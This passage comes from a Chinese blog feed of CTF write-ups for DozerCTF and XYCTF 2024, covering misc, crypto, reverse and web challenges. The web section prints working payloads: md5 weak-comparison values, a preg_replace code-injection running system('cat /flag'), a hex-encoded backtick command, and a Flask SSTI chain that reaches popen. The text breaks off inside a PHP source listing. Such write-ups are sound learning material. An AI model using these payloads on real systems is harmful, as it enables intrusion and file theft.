nums[<span class="hljs-number">9</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">13</span>] * <span class="hljs-number">3</span> == <span class="hljs-number">515</span>,<br>]  <br>  <br><span class="hljs-comment"># 创建一个求解器对象  </span><br>s = Solver()  <br>  <br><span class="hljs-comment"># 将方程添加到求解器中  </span><br>s.add(eqns)  <br>  <br><span class="hljs-comment"># 检查是否有解  </span><br><span class="hljs-keyword">if</span> s.check() == sat:  <br>    <span class="hljs-comment"># 获取解  </span><br>    m = s.model()  <br>    <span class="hljs-comment"># 打印解  </span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;nums<span class="hljs-subst">&#123;i&#125;</span> = <span class="hljs-subst">&#123;m[nums[i]]&#125;</span>&quot;</span>)  <br><span class="hljs-keyword">else</span>:  <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;方程组无解&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(m[nums[i]]))),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment">#B@by_5yth0n&amp;z3</span><br><span class="hljs-comment">#Dozerctf&#123;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="我是尊者"><a class="markdownIt-Anchor" href="#我是尊者"></a> 我是尊者</h2><p>看到wp挺离谱，这么简单</p><p><img src="/../../images/dozerctf2024/%E5%B0%8A%E8%80%85.png" alt="尊者"></p><p>Dozerctf{31de43b1a1fb565dabfa9ad8320f11de}</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTFwp及个人复盘</title>
    <link href="/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<hr><p>前言:写一写做出来的题目，和对web不会题目的复盘。是菜狗写的差轻喷。</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h2><p>没难度吧，题目还没看到就被队友解决了。扫一下码就行了。</p><h2 id="熊博士"><a class="markdownIt-Anchor" href="#熊博士"></a> 熊博士</h2><p>下载，发现图片和一段类似flag的文字。对应xyctf，想到应该是古典密码埃特巴什码，找个网站一把梭就行。</p><p><img src="/../images/xyctf/%E7%86%8A%E5%8D%9A%E5%A3%AB.png" alt="熊博士"></p><h2 id="ez_隐写"><a class="markdownIt-Anchor" href="#ez_隐写"></a> ez_隐写</h2><p>最外层是队友打开的，用的是360的解压，不明白原理，我也打不开。</p><p>打开之后里面的用软件跑一下密码是20240401(开赛日)，压缩包名字是watermark。</p><p>猜测应该是盲水印。</p><p><img src="/../images/xyctf/%E9%9A%90%E5%86%99.BMP" alt="隐写"></p><p>在网上锐化一下还是能看出来的。</p><p>XYCTF{159-WSX-IJN-852}</p><h2 id="game"><a class="markdownIt-Anchor" href="#game"></a> game</h2><p>看一下是一个图片.<img src="/../images/xyctf/game.jpg" alt="game"></p><p>一脸懵，一开始以为是什么特殊加密，用Google搜图发现是一个游戏。得到答案。</p><p><img src="/../images/xyctf/game1.png" alt="game1"></p><h2 id><a class="markdownIt-Anchor" href="#"></a> </h2><h2 id="zzl的护理小课堂"><a class="markdownIt-Anchor" href="#zzl的护理小课堂"></a> zzl的护理小课堂</h2><p>一开始以为就是搜题目解答我还特地都写了，结果写到100还是不给(真傻啊)。直接看源码，搜索alert,没出，那就score，搜到关键。<img src="/../images/xyctf/zzl1.png" alt="zzl1"></p><p>那就很简单了，打个断点然后score=101就行，注意flag是动态的。<img src="/../images/xyctf/zzl2.png" alt="zzl2"></p><h2 id="zip神之套"><a class="markdownIt-Anchor" href="#zip神之套"></a> zip神之套</h2><p>解压，猜不出来看看exe,这里需要用ida打开(什么居然考re,还好入了个门)。ida64打开，<img src="/../images/xyctf/zip.png" alt="zip"></p><p>里面是八位，继续盲猜开赛日，20240401，套在里面果然打开了。</p><p>继续打开，能直接打开里面的一个，估计flag是在另外一个zip里面，估计是明文攻击直接用ARPCH明文攻击，这样就能打开了（太懒了不放图了</p><h2 id="真签到"><a class="markdownIt-Anchor" href="#真签到"></a> 真&gt;签到</h2><p>用软件跑一下密码654321.打开发现啥也没有，用010打开zip,发现开头有flag。</p><h2 id="ez_base10242"><a class="markdownIt-Anchor" href="#ez_base10242"></a> EZ_Base1024*2</h2><p>下载文件用软件跑一下出答案，用base2048<img src="/../images/xyctf/base2048.png" alt="base2048"></p><h2 id="osint1"><a class="markdownIt-Anchor" href="#osint1"></a> Osint1</h2><p>这是社工题，还挺好玩的，先用百度识图看一下。找到这篇文章。<a href="https://club.m.autohome.com.cn/bbs/threadowner/0f96f216d67eb3dc/97798149-1.html">链接</a>，确定了是在江苏省南通市，搜一下旁边是什么海，是黄海，那就差一条路了。然后我自己跑到google上面看看有没有实景的，再结合图片发现应该是在那个园区附近，还有大风车。(这里用的腾讯地图发现的，其他的都看不清<img src="/../images/xyctf/osint1.png" alt="osint1"></p><p>看着像估计就是这里了，把可能的结果都试一下，发现是滨海东路。</p><h2 id="osint2"><a class="markdownIt-Anchor" href="#osint2"></a> Osint2</h2><p>图片给的是高铁站的图片给的提示是已经玩结束要回去了，在12306搜索一下车次每天只有一班g3293，龙门是在河南省，靠近这个高铁站的就只有几个景点，最后试出来是老君山(我还没爬过,悲伤.jpg)</p><h2 id="ez_osint"><a class="markdownIt-Anchor" href="#ez_osint"></a> Ez_osint</h2><p>图片下载直接整破防了，试了几种常规的png隐写没找出来，用stegsolve发现了一个水印网址 <a href="https://www.hi2future.com/">链接</a>，一开始找到的是假flag,观察图片上面的时间直接去找原来的那封信，发现留言有flag(别样的社工题)。</p><h2 id="出题有点烦"><a class="markdownIt-Anchor" href="#出题有点烦"></a> 出题有点烦</h2><p>下载文件解压，用软件跑一遍是123456，解压，看到前面三个都不能正常看，用010打开，把开头重新编辑，正常可以看了，第一个图片是假的flag。试了一会之后发现用foremost第五个图像可以分离一个压缩包，提出来用软件跑一遍，密码是xyctf，打开里面是正确的flag.</p><h2 id="美妙的歌声"><a class="markdownIt-Anchor" href="#美妙的歌声"></a> 美妙的歌声</h2><p>下载是wav音频，用Audacity打开，打开多视图发现频谱图好像有点东西，微调一会发现是有东西的</p><p><img src="/../images/xyctf/%E9%9F%B3%E9%A2%91.png" alt="音频"></p><p>这大概率不是直接的flag,应该是key,用deepsound打开，解密分离得到flag.txt，里面有flag,</p><p>XYCTF{T0uch_y0ur_he3rt_d55ply!!}</p><h2 id="roskpaperscissors"><a class="markdownIt-Anchor" href="#roskpaperscissors"></a> Rosk,Paper,Scissors!</h2><p>也是受高人指点，可以进行手搓，一个一个试，只有开头的会随机变，脚本多跑几遍就行了。上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">57882</span>)<br>a=[<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recvuntil(<span class="hljs-string">&quot;&quot;</span>)<br>    p.sendline(i)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="以下为复现彩蛋"><a class="markdownIt-Anchor" href="#以下为复现彩蛋"></a> 以下为复现（彩蛋</h2><p>首先第一段应该是一个八进制转字符串</p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B1.png" alt></p><p>然后第三段应该是二进制转字符串<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B2.png" alt="彩蛋2"></p><p>第二段说不需要扫描器，参考了其他师傅的wp，是下载图片转png图片，<a href="https://convertio.co/zh/">转化</a>，然后用zsteg得到<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B3.png" alt="彩蛋3"></p><p>审视了一下应该是键盘密码，<a href="http://wbic16.xedoloh.com/dvorak.html">键盘密码</a></p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B4.png" alt="彩蛋4"></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> CRYPTO</h1><h3 id="happy_to_solve1"><a class="markdownIt-Anchor" href="#happy_to_solve1"></a> happy_to_solve1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy2<br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><br><span class="hljs-attribute">n</span> =  <span class="hljs-number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-attribute">c</span> =  <span class="hljs-number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attribute">t</span> = <span class="hljs-number">1</span><br><span class="hljs-comment"># 因为q是p的取反后取比其值大的最近的一个素数，所以p + q = 2**512 - 1 + t</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">300</span>):<br>    <span class="hljs-attribute">phi</span> = n - (<span class="hljs-number">2</span>**<span class="hljs-number">512</span> - <span class="hljs-number">1</span> + t) + <span class="hljs-number">1</span><br>    <span class="hljs-attribute">d</span> = gmpy2.invert(e, phi)<br>    <span class="hljs-attribute">m</span> = pow(c, d, n)<br>    <span class="hljs-attribute">print</span>(long_to_bytes(m))<br>    <span class="hljs-attribute">t</span> += <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><p>这部分就是闹着玩随便写写，我不会re就看看题目。所有也懒得放图了。</p><h2 id="聪明的信使"><a class="markdownIt-Anchor" href="#聪明的信使"></a> 聪明的信使</h2><p>这个用ida打开，然后空格一下就能看到明显类似flag的一段内容。</p><p>我记得好像是栅栏密码，网上一把梭就行了，没什么难度。</p><h2 id="你是真的大学生吗"><a class="markdownIt-Anchor" href="#你是真的大学生吗"></a> 你是真的大学生吗？</h2><p>这题有一丢丢借鉴别人，但是问题不大。同样也是用ida打开就行，找到关键内容就行，也是懒不想看了，（我又不是re手，直接上代码和答案。<img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F.png" alt="大学生"></p><p><img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F1.png" alt="大学生1">差不多吧，嘿嘿。</p><h2 id="debugme"><a class="markdownIt-Anchor" href="#debugme"></a> DebugMe</h2><p>这题其实我感觉挺简单的，具体操作不会，下载一个安卓模拟器，然后用jeb调debugger就行，就能出答案了，but 我不会，sorry啦。</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><p>web真是心碎啊，发现自己不会的还是太多太多了，会把所有没写出来的也顺带复盘一下。</p><h2 id="ezhttp"><a class="markdownIt-Anchor" href="#ezhttp"></a> ezhttp</h2><p>diserach扫一下有flag.php和robots.txt,里面有账户和密码。</p><p>跟着要求在bp里面改就行了，考察一下头，wp如下。</p><p>User-Agent: XYCTF</p><p>client-Ip:127.0.0.1</p><p>via:ymzx.qq.com</p><p>Referer:yuanshen.com</p><p>Cookie:XYCTF</p><h2 id="warm-up"><a class="markdownIt-Anchor" href="#warm-up"></a> warm up</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;next.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$XYCTF</span> = <span class="hljs-string">&quot;Warm up&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$md5</span>) &amp;&amp; <span class="hljs-variable">$md5</span> == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ezez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> == <span class="hljs-variable">$XYCTF</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> != <span class="hljs-string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$XY</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;XYCTF_550102591&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level2</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;学这么久,传参不会传?&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>第一步要传入两个值不等但是md5弱比教相等。尝试传入数组或者用字符串弱比教。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">val1</span>=QNKCDZO&amp;val2=s878926199a<br></code></pre></td></tr></table></figure><p>第二步传入值的md5的值等于本身。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">md5</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>e215962017<br></code></pre></td></tr></table></figure><p>第三步可以利用变量覆盖，把原先的覆盖掉，如下图</p><p><img src="/../images/xyctf/warmup.png" alt="warm up"></p><p>，之后进第二个页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;操作你O.o&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);  <span class="hljs-comment">// 我可不会像别人一样设置10来个level</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;有点汗流浃背&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>简要讲一下intval,这个函数会强制把传入的内容转换为数字，但是如果传入的内容是数组就可以进行绕过。</p><p>先尝试post一个a[]=1，会显示出操作你0.o</p><p>再审计一下下面的内容,问问万能的chatgpt这是个啥</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_GET[<span class="hljs-string">&#x27;a&#x27;</span>] 作为正则表达式模式，$_GET[<span class="hljs-string">&#x27;b&#x27;</span>] 作为替换的文本或模式，$_GET[<span class="hljs-string">&#x27;c&#x27;</span>] 作为输入的字符串或数组。具体来说，这段代码是根据从 URL 中获取的参数来执行正则表达式的搜索和替换操作。<br></code></pre></td></tr></table></figure><p>尝试正则几个字母，然后b输入system(‘cat /flag’),c再输入几个前面正则的内容就行</p><p>post传入上面的内容对应，上图片。</p><p><img src="/../images/xyctf/warm1.png" alt="warm1"></p><h2 id="ezmd5"><a class="markdownIt-Anchor" href="#ezmd5"></a> ezMD5</h2><p>上传两个图片Md5值相同即可，csdn上面有,可以自己搜，最后能出flag.</p><h2 id="ezmake"><a class="markdownIt-Anchor" href="#ezmake"></a> ezMake</h2><p>偷偷扫了一下，问题不大吧，/flag就能出了<img src="/../images/xyctf/make.png" alt="make"></p><h2 id="ezmake-2"><a class="markdownIt-Anchor" href="#ezmake-2"></a> ez?make</h2><p>本题可以通过两次十六进制绕过，从而得到flag</p><p>先第一次转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag636174202f666c6167<br></code></pre></td></tr></table></figure><p>再转第二次</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">636174202f666c6167</span><span class="hljs-number">363336313734323032663636366336313637</span><br></code></pre></td></tr></table></figure><p>这里提个知识点</p><p>xxd -r 是将十六进制转换回去，-p是以postscript的连续十六进制转储输出。这也叫做纯十六进制转储。</p><p>所有应该为</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">`echo <span class="hljs-string">&quot;363336313734323032663636366336313637&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">xxd</span> -r -p`<br></code></pre></td></tr></table></figure><p>``是执行语句，执行里面的内容</p><p>xxd -r -p用来转化保持。</p><p><img src="/../images/xyctf/ez%EF%BC%9Fmake.png" alt="ez？make"></p><h2 id="我是一个复读机"><a class="markdownIt-Anchor" href="#我是一个复读机"></a> 我是一个复读机</h2><p>首先猜测用户名是admin,给了字典爆破一下，密码是asdqwe</p><p>进去输入常规的sql和ssit和命令执行都不行</p><p>尝试输入汉字有括号，那我估计就是从这里入手，构造一个flask的注入</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">哈%<span class="hljs-keyword">print</span>(()|attr(request.<span class="hljs-keyword">args</span>.a))|attr(request.<span class="hljs-keyword">args</span>.base)|attr(request.<span class="hljs-keyword">args</span>.sub)()|attr(request.<span class="hljs-keyword">args</span>.getit)(132)|attr(request.<span class="hljs-keyword">args</span>.ini)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">glo</span>)|attr(request.<span class="hljs-keyword">args</span>.getit)(request.<span class="hljs-keyword">args</span>.p)(request.<span class="hljs-keyword">args</span>.cmd)|attr(request.<span class="hljs-keyword">args</span>.r)()%&amp;a=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getit=__getitem__&amp;cmd=<span class="hljs-keyword">cat</span> /flag&amp;ini=__init__&amp;<span class="hljs-keyword">glo</span>=__globals__&amp;p=popen&amp;r=<span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>可以得到flag</p><h2 id="ezrce"><a class="markdownIt-Anchor" href="#ezrce"></a> ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>]; <br>    <span class="hljs-variable">$cmd_char</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">foreach</span>(<span 